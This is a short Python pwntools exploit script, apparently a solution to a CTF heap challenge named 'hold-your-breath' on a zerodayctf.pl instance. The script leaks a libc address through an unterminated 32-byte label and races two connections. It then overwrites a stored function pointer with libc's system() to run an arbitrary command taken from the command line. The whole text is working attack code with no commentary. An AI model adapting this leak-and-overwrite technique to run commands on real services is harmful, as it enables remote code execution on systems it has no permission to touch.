from pwn import *
import sys,time
context.log_level='error'
D='/home/parallels/pwn_[medium]-hold-your-breath/'
libc=ELF(D+'libc.so.6',checksec=False)
H,P='hold-your-breath-940889dddb6a.inst.zerodayctf.pl',1337
cmd=sys.argv[1].encode()
def conn():
    r=remote(H,P,ssl=True); r.recvuntil(b'> '); return r
c1=conn()
c1.sendline(b'1'); c1.sendlineafter(b': ',b'0'); c1.sendafter(b'label: ',b'A'*32); c1.recvuntil(b'> ')
c1.sendline(b'2'); c1.recvuntil(b'A'*32); leak=u64(c1.recvline()[:-1].ljust(8,b'\0'))
libc.address=leak-libc.sym.puts; print(hex(libc.address))
c2=conn()
c2.sendline(b'3'); c2.sendlineafter(b': ',b'0'); c2.recvuntil(b'leaves')
c1.sendline(b'4'); c1.sendlineafter(b': ',b'0'); c1.recvuntil(b'> ')
c1.sendline(b'5'); c1.sendafter(b'): ',cmd.ljust(32,b'\0')+p64(libc.sym.system)); c1.recvuntil(b'> ')
c1.sendline(b'2'); print(c1.recvuntil(b'> '))
t=time.time(); print(c2.recvuntil(b'cleaned',timeout=30), time.time()-t)
print(c2.recvrepeat(1))
